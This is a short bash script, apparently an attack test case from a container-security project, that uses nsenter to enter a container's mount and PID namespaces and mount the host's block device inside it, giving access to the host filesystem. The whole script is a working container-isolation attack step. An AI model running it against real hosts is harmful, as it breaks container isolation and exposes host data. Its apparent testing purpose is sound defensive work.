#!/bin/bash

attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

container_pid=$(cat PID)
dev="/dev/$(cat sdev_of_fs)"

nsenter --target ${container_pid} --mount --pid -- mount ${dev} /tmpmount
